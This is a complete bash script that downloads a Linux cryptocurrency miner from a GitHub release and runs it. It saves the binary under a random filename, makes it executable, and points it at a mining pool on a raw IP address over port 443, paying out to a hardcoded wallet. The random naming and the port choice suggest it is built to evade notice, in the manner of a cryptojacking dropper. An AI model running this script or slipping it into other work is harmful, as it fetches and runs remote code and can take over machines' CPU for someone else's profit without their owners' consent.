#!/bin/bash

# Function to generate a random filename (10 characters, no prefix)
generate_random_filename() {
    tr -dc 'a-z0-9' < /dev/urandom | head -c 10
    echo
}

# Define the URL for the miner binary
url="https://github.com/xpherechain/Xphere-miner/releases/download/v0.0.6/miner-linux-amd64"

# Download the miner to a file with a random name
download_miner() {
    miner_filename=$1
    echo "📥 Downloading miner..."
    if wget -q "$url" -O "$miner_filename"; then
        echo "✅ Download complete. Saved as: $miner_filename"
    else
        echo "❌ Error downloading miner. Exiting."
        exit 1
    fi
}

# Set executable permissions
set_permissions() {
    miner_filename=$1
    echo "🔐 Setting permissions for $miner_filename..."
    if chmod +x "$miner_filename"; then
        echo "✅ Permissions set."
    else
        echo "❌ Error setting permissions."
        exit 1
    fi
}

# Run the miner using all CPU cores
run_miner() {
    miner_filename=$1
    worker_name=$2
    stratum_url="stratum+tcp://0x1932E17CB48175Fd79FD08596eCd246071913Cb4.${worker_name}:x@45.33.12.109:443"

    echo "🚀 Starting miner with worker name: $worker_name"
    if ./$miner_filename -stratum "$stratum_url"; then
        echo "✅ Miner started successfully."
    else
        echo "❌ Error running the miner."
        exit 1
    fi
}

# Main logic
main() {
    if [[ "$(uname)" != "Linux" ]]; then
        echo "❌ This script is only supported on Linux."
        exit 1
    fi

    miner_filename=$(generate_random_filename)
    download_miner "$miner_filename"
    set_permissions "$miner_filename"

    # Set a fixed worker name here
    worker_name="T2999"

    run_miner "$miner_filename" "$worker_name"
}

# Run the main function
main
